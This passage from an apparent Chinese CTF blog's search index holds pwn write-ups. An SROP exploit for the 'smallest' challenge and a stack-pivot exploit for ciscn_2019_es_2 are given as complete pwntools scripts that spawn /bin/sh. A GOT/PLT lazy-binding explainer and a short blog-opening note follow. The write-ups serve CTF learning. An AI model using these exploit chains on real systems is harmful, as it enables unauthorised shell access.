gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>再次SROP就能执行<code>execve(&quot;/bin/sh&quot;,0,0)</code></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,25243)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4000Be&quot;)</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">stack_addr = u64(io.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#&amp; 0xfffffffffffffff000 - 0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] stack_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x300</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"><span class="comment"># sigframe.rsp = stack_addr+ 0x190</span></span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe)</span><br><span class="line">payload = payload+(<span class="number">0x300</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.wangan.com/docs/1081"> SROP</a></p><p><a href="https://www.dazhuanlan.com/freedeaths/topics/1225728">360春秋杯smallest</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14281505.html">SROP例题</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈漏洞系列（一）-- 栈迁移</title>
      <link href="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当溢出的长度太小时，可以通过<code>leave_ret_gadget</code>来将<code>ebp</code>和<code>esp</code>迁移到我们想要的位置，比如：一个咱已经布置好<code>ROP</code>链的地方</p><p>假设在栈上布置如下的<code>ROP</code>链，我将通过图片来展示攻击效果</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131830383.png" class=""><p>布置好之后，每个程序就返回前都会恢复栈，就如下图的程序，所以我们就等待程序<code>leave ret</code>:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131920731.png" class=""><p><code>leave</code>就是等价于上面说到的那段汇编代码，首先执行的是<code>mov esp,ebp</code>，这会让图中的0x108放入到<code>esp</code>中，我们的栈就会发生如下变化：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131951134.png" class="" title="image-20211005131951134"><p>接着就是<code>pop ebp</code>，诶~，这时候我们的<code>ebp</code>就变成了我们想要迁移的位置了:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132014543.png" class=""><p>我们在回顾一下栈上的情况，因为刚刚<code>pop ebp</code>，所以我们的<code>esp</code>指向了<code>leave_ret</code>这个<code>gadget</code>：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132035570.png" class=""><p>所以程序又执行了一次<code>leave</code>，我们迁移后的栈就会变成这样：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132117043.png" class=""><p>非常的神奇吼！我们的<code>esp</code>指向了<code>system</code>函数！也就是说我们已经成功的获取了<code>shell</code>！！！</p><blockquote><p>可能有读者要问了：啊？，你这<code>ebp</code>不是栈底寄存器吗？他怎么指向了一个奇怪的地方，你这不行啊？，对，此时的<code>ebp</code>已经指向了一个奇怪（后面的例题会展示奇怪的点）的地方，但是问题不大，我们只要明白<code>ebp</code>和<code>esp</code>最根本的作用是什么就不会觉得奇怪了，<code>ebp</code>的作用是来定位每个函数的栈的大小，当函数返回时才需要通过<code>ebp</code>来恢复主函数的栈，而<code>esp</code>才是真正控制栈的进出，所以我们只要控制<code>esp</code>指向我们想要指向的函数就可以达到我们的目的了，至于<code>ebp</code>嘛，我们都拿到<code>shell</code>了，它能不能成功的返回已经不关我事了嘿嘿嘿~</p></blockquote><h2 id="例题解析"><a href="#例题解析" class="headerlink" title="例题解析"></a>例题解析</h2><p>这里拿19年国赛的一道题(<code>ciscn_2019_es_2</code>)来讲解一下，经典入门题，在<code>buu</code>上，大伙可以去玩玩</p><p>习惯<code>checksec</code>一下：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132145614.png" class=""><p><code>main</code>函数看看：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132203888.png" class=""><p><code>vul</code>函数不用多说，肯定就是受害函数了，仔细一看，只能溢出8字节吼！也真够抠的，不过我们刚刚学了栈迁移，不慌</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132222944.png" class=""><p>我们一个个来看吼，首先程序<code>memset</code>了<code>s</code>这个数组，但是很奇怪，它初始化又不全部清零，就整了0x20个字节，它为啥要这么做呢，其实就是在泄露信息，如果它没全部清零，那后0x10是什么东西呢？诶~，就是栈上的地址对吧，所以当我们覆盖了<code>s</code>数组最后的<code>&quot;\n&quot;</code>，那<code>printf</code>打印s的时候，是不是就不会截断，是不是就打印了那未初始化的值，也就泄露了栈上的地址，有人可能又有疑问了，泄露栈上的地址有什么用呢？别急，慢慢来！</p><p>在第一次<code>read</code>（）的时候，我输入了24个<code>a</code>和我的<code>id</code>，计算一下s的位置到<code>ebp</code>的距离，拿起你的小计算器计算一下：<code>0xa8 - 0x80</code> 是不是等于0x28，至于为啥要到<code>ebp</code>呢，别问，问就是后面好定位偏移</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132246238.png" class=""><p>按照上面的想法我们写出下面的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面我说过，我们栈迁移是迁移到另一个有我们ROP链的地方，但是这里我们并没有办法往其他地方写入我们的ROP链，我们只能往栈上写入，所以我有个大胆的想法，栈迁移到栈上，这样我们刚刚泄露的栈地址就有用了是不，所以我们在第二次read（）的时候就将栈布置成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br></pre></td></tr></table></figure><p>咱动调看看：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132304965.png" class=""><p>leave之后：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132322783.png" class=""><p>注意<code>esp</code>和<code>ebp</code>，是不是<code>esp</code>比<code>ebp</code>还大哈哈哈:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132336295.png" class=""><p>再往下执行，咱就发现<code>esp</code>指向了<code>system</code>的<code>plt</code>：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132348696.png" class=""><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node3.buuoj.cn&#x27;,27587)</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">io.success(<span class="string">&#x27;[*] ebp_addr: &#x27;</span> + <span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux运行机制（一）-- 延迟绑定</title>
      <link href="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
      <url>/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>程序在动态载入内存的时候并不会将所有函数都加载进内存，而是采用延时绑定的机制，即当真正使用当该函数的时候才将GOT表中的地址转化成真实的地址，</p><p>写一个简单的demo进行测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -g -o got_plt got_plt.c </span></span><br></pre></td></tr></table></figure><p>编译完成后，我们进入gdb进行调试，先将程序反汇编，我们来看看在那下断点合适，我们既然要研究PLT和GOT表，那肯定要断在<code>call put</code>这条汇编指令这吧，下断点我们来看看</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/3.png" class=""><p>下完断点，我们运行起来，单步步入就来到图中的地方，它先跳到<code>_GLOBAL_OFFSET_TABLE_</code>里面，也就是我们说的GOT表，那它会JMP到哪里去呢？等下揭晓….</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1.png" class=""><p>我们用<code>pwndbg</code>查看一下这个位置存了什么，是不是有点眼熟，这不就是刚刚JMP的下一条指令的地方吗？没错它又跳回来了…紧接着它push了一个参数又往下跳转了，又push了一个参数就跳到<code>_dl_runtime_resolve_</code>这个函数里面，在这就不详细的阐述<code>_dl_runtime_resolve_</code>函数的具体实现，咱只要记得是这个函数帮我们把<code>GOT</code>表里面的值换成了真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/2.png" class=""><p>我们在此函数执行完成之后再去看<code>0x804a00c</code>里面存的是什么，对吧…现在就是真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/4.png" class=""><p>如果还是保持怀疑，我们反汇编进去看看，是puts数的实现对吧…</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5.png" class=""><p>最后提一嘴，GOT表只是存放函数地址的表而已，真正的调用是需要通过PLT表来进行跳转</p><p>下面是一位大佬画的图就拿来用了：</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-bcf9343191848103.png" class="" title="5970003-bcf9343191848103"><p>延迟绑定完成之后就可以直接去GOT里面拿真实的函数地址啦！</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-9baedd55881a39dd.png" class="" title="5970003-9baedd55881a39dd">]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梦开始的地方</title>
      <link href="/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/"/>
      <url>/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<p><code>ZYen</code>的小站自今天起就正式开张啦！之前买服务器搭博客不得劲，现在正式转为<code>github</code>辽，文章的日期可能有点问题，不过无伤大雅，愿自己热爱的事情最终都能有个好结果！（撒花✨）</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
